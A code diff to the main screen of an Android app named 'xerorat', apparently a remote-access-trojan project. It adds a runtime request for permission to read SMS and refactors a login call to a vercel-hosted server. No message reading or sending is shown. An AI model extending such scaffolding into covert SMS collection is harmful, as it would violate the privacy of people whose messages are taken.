@@ -1,13 +1,17 @@
 package com.arnabxero.xerorat
 
+import android.Manifest
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.widget.Button
 import android.widget.EditText
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import retrofit2.Call
 import retrofit2.Callback
 import retrofit2.Response
@@ -39,6 +43,29 @@ class MainActivity : AppCompatActivity() {
         passwordEditText = findViewById(R.id.passwordEditText)
         createUserButton = findViewById(R.id.createUserButton)
 
+        // Request the READ_SMS permission
+        if (ContextCompat.checkSelfPermission(
+                this,
+                Manifest.permission.READ_SMS
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.READ_SMS),
+                READ_SMS_PERMISSION_CODE
+            )
+        }
+
+        createUserButton.setOnClickListener {
+            // Call the API with Retrofit
+            val username = usernameEditText.text.toString()
+            val password = passwordEditText.text.toString()
+            val credentials = UserCredentials(username, password)
+            performLogin(credentials)
+        }
+    }
+
+    private fun performLogin(credentials: UserCredentials) {
         // Initialize Retrofit
         val retrofit = Retrofit.Builder()
             .baseUrl("https://xerorat-server.vercel.app/") // Replace with your base URL
@@ -47,62 +74,61 @@ class MainActivity : AppCompatActivity() {
 
         apiService = retrofit.create(ApiService::class.java)
 
-        createUserButton.setOnClickListener {
-            val username = usernameEditText.text.toString()
-            val password = passwordEditText.text.toString()
+        // Call the API with Retrofit
+        val call = apiService.login(credentials)
 
-            // Call the API with Retrofit
-            val credentials = UserCredentials(username, password)
-            val call = apiService.login(credentials)
-
-            call.enqueue(object : Callback<ApiResponse> {
-                override fun onResponse(
-                    call: Call<ApiResponse>,
-                    response: Response<ApiResponse>
-                ) {
-                    if (response.isSuccessful) {
-                        val apiResponse = response.body()
-                        if (apiResponse != null) {
-                            // Process the response
-                            val userId = apiResponse.user_id
-                            saveUserIdToLocalStorage(userId) // Save user_id to SharedPreferences
-                            Toast.makeText(
-                                this@MainActivity,
-                                "Message: ${apiResponse.message}, User ID: $userId",
-                                Toast.LENGTH_SHORT
-                            ).show()
-
-                            // Start Page2Activity
-                            val intent = Intent(this@MainActivity, Page2Activity::class.java)
-                            startActivity(intent)
-                        }
-                    } else {
-                        // Handle the error
+        call.enqueue(object : Callback<ApiResponse> {
+            override fun onResponse(
+                call: Call<ApiResponse>,
+                response: Response<ApiResponse>
+            ) {
+                if (response.isSuccessful) {
+                    val apiResponse = response.body()
+                    if (apiResponse != null) {
+                        // Process the response
+                        val userId = apiResponse.user_id
+                        saveUserIdToLocalStorage(userId) // Save user_id to SharedPreferences
                         Toast.makeText(
                             this@MainActivity,
-                            "Error: ${response.message()}",
+                            "Message: ${apiResponse.message}, User ID: $userId",
                             Toast.LENGTH_SHORT
                         ).show()
-                    }
-                }
 
-                override fun onFailure(call: Call<ApiResponse>, t: Throwable) {
-                    // Handle the network failure
-                    t.printStackTrace()
+                        // Start Page2Activity
+                        val intent = Intent(this@MainActivity, Page2Activity::class.java)
+                        startActivity(intent)
+                    }
+                } else {
+                    // Handle the error
                     Toast.makeText(
                         this@MainActivity,
-                        "Failed to send data to server",
+                        "Error: ${response.message()}",
                         Toast.LENGTH_SHORT
                     ).show()
                 }
-            })
-        }
+            }
+
+            override fun onFailure(call: Call<ApiResponse>, t: Throwable) {
+                // Handle the network failure
+                t.printStackTrace()
+                Toast.makeText(
+                    this@MainActivity,
+                    "Failed to send data to server",
+                    Toast.LENGTH_SHORT
+                ).show()
+            }
+        })
     }
 
     private fun saveUserIdToLocalStorage(userId: String) {
-        val sharedPref: SharedPreferences = getSharedPreferences("xerorat_user_id", Context.MODE_PRIVATE)
+        val sharedPref: SharedPreferences =
+            getSharedPreferences("xerorat_user_id", Context.MODE_PRIVATE)
         val editor: SharedPreferences.Editor = sharedPref.edit()
         editor.putString("user_id", userId)
         editor.apply()
+    }
+
+    companion object {
+        private const val READ_SMS_PERMISSION_CODE = 123 // You can choose any code you like
     }
 }
